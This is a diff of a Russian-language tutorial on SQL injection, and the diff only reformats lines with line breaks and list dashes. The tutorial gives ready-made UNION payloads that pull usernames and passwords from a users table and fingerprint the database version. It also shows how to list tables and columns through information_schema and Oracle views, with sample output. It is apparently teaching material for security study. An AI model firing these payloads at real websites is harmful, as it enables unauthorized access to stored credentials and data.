@@ -43,6 +43,7 @@ SQL-инъекция — это уязвимость веб-безопаснос
 
 ### 3.3 UNION-атака (Использование SQL-инъекции и атаки UNION для извлечения важных данных.)
 - ' UNION SELECT username, password FROM users--<br>
+
 Для осуществления этой атаки необходимо знать, что существует таблица с именем usersи двумя столбцами с именами usernameи password.
 Без этой информации вам пришлось бы угадывать имена таблиц и столбцов.
 Все современные базы данных предоставляют способы изучения структуры базы данных и определения того, какие таблицы и столбцы они содержат.
@@ -76,15 +77,15 @@ portswigger.net/web-security/sql-injection/cheat-sheet<br>
 ' UNION SELECT @@version--
 
 #### Пример вывода (Microsoft SQL Server):
-Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
-Mar 18 2018 09:11:49
-Copyright (c) Microsoft Corporation
-Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)<br>
+Mar 18 2018 09:11:49<br>
+Copyright (c) Microsoft Corporation<br>
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)<br>
 
 ### Получение списка таблиц (кроме Oracle)
-Большинство типов баз данных (за исключением Oracle) имеют набор представлений, называемых информационной схемой. Она предоставляет информацию о базе данных.
-Запрос для получения списка таблиц:
-SELECT * FROM information_schema.tables
+Большинство типов баз данных (за исключением Oracle) имеют набор представлений, называемых информационной схемой. Она предоставляет информацию о базе данных.<br>
+Запрос для получения списка таблиц:<br>
+- SELECT * FROM information_schema.tables
 
 #### Пример результата:
 TABLE_CATALOG	TABLE_SCHEMA	TABLE_NAME	TABLE_TYPE
@@ -109,12 +110,12 @@ MyDatabase	dbo	Users	Password	varchar
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users'--
 
 ### Анализ базы данных в Oracle
-В Oracle нет information_schema. Используй другие представления:
+В Oracle нет information_schema. Используй другие представления:<br>
 
 Что узнать	     Запрос
 Список таблиц	   SELECT * FROM all_tables
 Столбцы таблицы	 SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
 ### Готовые payload'ы для Oracle:
-' UNION SELECT table_name, NULL FROM all_tables--
-' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--
+- ' UNION SELECT table_name, NULL FROM all_tables--<br>
+- ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--<br>
 ### Важно: В Oracle все имена таблиц и столбцов хранятся в верхнем регистре!
